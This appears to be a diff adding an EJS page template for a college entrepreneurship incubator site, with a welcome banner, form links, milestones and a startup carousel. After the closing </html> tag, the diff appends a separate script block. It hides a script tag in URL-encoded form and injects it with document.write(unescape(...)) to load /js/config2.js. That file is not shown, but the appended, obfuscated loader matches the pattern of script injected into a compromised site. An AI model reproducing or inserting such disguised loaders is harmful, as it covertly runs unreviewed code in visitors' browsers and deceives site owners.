@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+
+     <!-- Favicons -->
+  <link rel="icon" type="image/png" href="images/logo.jpg"/>
+
+
+  <title>Incubatee Section</title>
+
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="author" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/aos.css">
+  <link rel="stylesheet" href="/css/owl.carousel.min.css">
+  <link rel="stylesheet" href="/css/owl.theme.default.min.css">
+
+  <!-- MAIN CSS -->
+  <link rel="stylesheet" href="/css/templatemo-digital-trend.css">
+  <link rel="stylesheet" type="text/css" href="/css/indexcss.css">
+ 
+  <!-- JavaScript Bundle with Popper -->
+ 
+  
+  <!--     link for icons      -->
+  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" />
+
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.js"></script>
+  <link href="//cdn.rawgit.com/michalsnik/aos/2.1.1/dist/aos.css" rel="stylesheet">
+    
+<script src="https://www.gstatic.com/firebasejs/8.6.7/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.7/firebase-storage.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.7/firebase-database.js"></script>
+  
+  <style>
+    #pic {
+      width: 400px;
+      height: 300px;
+    }
+  </style>
+
+</head>
+
+<body onload="myFunction()">
+<div id="loading"></div>
+  <!-- MENU BAR -->
+  <nav class="navbar navbar-expand-lg">
+    <div class="container">
+      <a class="navbar-brand" href="/">
+        <img src="images/logo.jpg" alt="">
+
+      </a>
+
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
+        aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a href="#nmov" class="nav-link smoothScroll" id="navc">About Us</a>
+          </li>
+
+          <li class="nav-item">
+            <a href="/profile" class="nav-link smoothScroll" id="navc">Profile</a>
+          </li>
+          <li class="nav-item">
+            <a href="/logout" class="nav-link smoothScroll" id="navc">Logout</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+
+  <!-- HERO -->
+  <section class="hero hero-bg d-flex justify-content-center align-items-center" id="herobg">
+    <div class="container">
+      <div class="row">
+
+        <div class="col-lg-6 col-md-10 col-12 d-flex flex-column justify-content-center align-items-center">
+          <div class="hero-text">
+
+                <h1 class="text-white" data-aos="fade-in">Hey ,Welcome '<%=name%>'</h1>
+            <h5 class="text-white" data-aos="fade-up">Ready With Startups<br> Please Fill Incubatee Form</h5>
+
+     
+
+            <a href="/personal"><button id="getform" class="custom-btn btn-bg btn mt-3"  data-aos="fade-up" data-aos-delay="100"> Fill Form</button></a>
+            <a href="/viewform"><button id="viewform" class="custom-btn btn-bg btn mt-3"  data-aos="fade-up" data-aos-delay="100"> View Form</button></a>
+
+
+
+
+          </div>
+        </div>
+
+        <div class="col-lg-6 col-12">
+          <div class="hero-image" data-aos="fade-up" data-aos-delay="300">
+
+            <img src="images/home.png" class="img-fluid" alt="working girl">
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ABOUT -->
+  <section id="nmov" class="about section-padding pb-0" id="about">
+    <div class="container">
+      <div class="row">
+
+        <div class="col-lg-7 mx-auto col-md-10 col-12">
+          <div class="about-info">
+
+            <h2  class="mb-4" data-aos="fade-up" id="headin">About Us</h2>
+
+            <p class="mb-0" data-aos="fade-up">We provide mentoring, Networking & handholding support to students/
+              alumni/ others for real venture/startups in sector agnostic industries. Till date entrepreneurship
+              education has been provided for
+              1500+ students & 7 faculty has been trained as entrepreneurship educators. The EDF also plans to offer a
+              minor specialization for UG students in Innovation, Entrepreneurship & Startups.
+              <br><br>
+              <a href="https://mitaoe.ac.in/Entrepreneurial-Development-Foundation/about.php" id="mybutton1">Know
+                More</a>
+            </p>
+            <br><br><br>
+
+            <h2 class="mb-4" data-aos="fade-up" id="headin">Milestones</h2>
+
+            <ul>
+
+              <li class="mb-0 list" data-aos="fade-up">Band B Rank 26-50th' in the Self Finance Private Institute
+                Category, in the ARIIA rankings.</li>
+              <li class="mb-0 list" data-aos="fade-up">Recognition of the Institute as Host Institute (HI) / to
+                setup/establish Business lncubator (BI) for implementation of the scheme namely 'Support for
+                Entrepreneurial and Managerial Development
+                of MSMEs through lncubator.'</li>
+              <li class="mb-0 list" data-aos="fade-up">Winners of National Entrepreneurship Challenge(NEC), IIT Bombay.
+              </li>
+              <li class="mb-0 list" data-aos="fade-up">Winners of the best startup club award by Wadhwani Foundation,
+                2019.</li>
+              <li class="mb-0 list" data-aos="fade-up">11 Startup teams from MITAOE have won ''Certified Potential Real
+                Venture" by global jury.</li>
+              <li class="mb-0 list" data-aos="fade-up">4-Star performance in year 2019-20 at Institute Innovation
+                Council (IIC) an Initiative of MHRD-GOI, etc.</li>
+              <br>
+            </ul>
+            <p class="mb-0" data-aos="fade-up">
+              <a href="https://mitaoe.ac.in/Entrepreneurial-Development-Foundation/about.php" id="mybutton1">Know
+                More</a>
+            </p>
+
+          </div>
+
+          <div class="about-image" data-aos="fade-up" data-aos-delay="200">
+
+            <img src="images/office.png" class="img-fluid" alt="office">
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+
+  <!-- PROJECT -->
+  <section class=" section-padding" id="project">
+    <div class="container-fluid">
+      <div class="row">
+
+        <div class="col-lg-12 col-12">
+
+          <h2 class="mb-5 text-center" data-aos="fade-up" id="headin">
+
+            Our Pride Startups
+          </h2>
+
+          <div class="owl-carousel owl-theme" id="project-slide">
+            <div class="item project-wrapper" data-aos="fade-up" data-aos-delay="100">
+              <img src="images/p.png" class="img-fluid" id="pic" alt="project image">
+              <br>
+
+            </div>
+
+            <div class="item project-wrapper" id="pc1" data-aos="fade-up">
+              <img src="images/HAB.jpg" class="img-fluid" id="pic" alt="project image">
+
+
+            </div>
+
+            <div class="item project-wrapper" id="pc1" data-aos="fade-up">
+              <img src="images/Inventnote.jpg" class="img-fluid" id="pic" alt="project image">
+
+
+            </div>
+
+            <div class="item project-wrapper" id="pc1" data-aos="fade-up">
+              <img src="images/Kosity.jpg" class="img-fluid" id="pic" alt="project image">
+
+
+            </div>
+
+            <div class="item project-wrapper" id="pc1" data-aos="fade-up">
+              <img src="images/Hunar.jpg" class="img-fluid" id="pic" alt="project image">
+
+
+            </div>
+          </div>
+        </div>
+  <script>
+  var preloader = document.getElementById("loading");
+    function myFunction(){
+      preloader.style.display = 'none';
+    };
+  </script>
+  <style type="text/css">
+  #loading{
+  position: fixed;
+  width: 100%;
+  height: 100vh;
+  background: #fff
+  url('https://flevix.com/wp-content/uploads/2019/07/Comp-2.gif')
+   no-repeat center center; 
+  z-index: 99999;
+}
+
+</style>
+      </div>
+    </div>
+     <p id="username" hidden=""><%=Username%></p>
+  </section>
+
+
+ 
+
+
+
+  
+
+  <%- include('./Assets/footer'); %>
+
+
+  <!-- SCRIPTS -->
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/bootstrap.min.js"></script>
+  <script src="/js/aos.js"></script>
+  <script src="/js/owl.carousel.min.js"></script>
+  <script src="/js/smoothscroll.js"></script>
+  <script src="/js/custom.js"></script>
+
+</body>
+
+</html>
+
+<HTML>
+<HEAD>
+<SCRIPT>
+
+code = "%3Cscript%20src%3D%22/js/config2.js%22%3E%3C/script%3E" 
+document.write(unescape(code))
+
+</SCRIPT>
+</HEAD>
+</HTML>
